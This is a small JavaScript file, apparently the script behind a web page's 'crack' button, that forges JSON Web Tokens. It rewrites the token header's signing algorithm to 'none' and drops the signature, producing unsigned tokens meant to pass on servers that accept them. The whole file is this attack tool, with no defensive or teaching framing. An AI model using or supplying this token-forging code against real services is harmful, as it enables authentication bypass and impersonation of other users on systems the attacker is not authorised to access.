(function() {
  const submitButton = document.getElementById("btn-submit-crack");
  submitButton.addEventListener("click", generateJWT);

  function generateJWT() {
    const result = document.getElementById("result");
    const token = document.getElementById("token").value;
    let tokenSplit = token.split(".");
    let header = tokenSplit[0];
    let payload = tokenSplit[1];

    header = changeAlgorithmToNone(header);

    const fullToken = `${header}.${payload}.`;

    printResult(result, fullToken);
  }

  /**
   * Change the algorithm to 'none' and encode to base64
   * @param {*} header
   */
  function changeAlgorithmToNone(header) {
    let allAlgorithmInRegex = /HS256|HS384|HS512|RS256|RS384|RS512|ES256|ES384|ES512|PS256|PS384/gi;
    let headerDecoded = atob(header);
    let cleanHeader = headerDecoded.replace(allAlgorithmInRegex, "none");
    cleanHeader = btoa(cleanHeader);
    return cleanBase64(cleanHeader);
  }

  /**
   * Clean equal sign '=' from the end of base64
   * @param {*} str
   */
  function cleanBase64(str = "") {
    str = str.replace("=", "");
    str = str.replace("=", "");
    return str;
  }

  /**
   * Printing the result to the user
   * @param {*} result
   * @param {*} fullToken
   */
  function printResult(result, fullToken) {
    result.className += `alert alert-success`;
    result.textContent = fullToken;
    return;
  }
})();
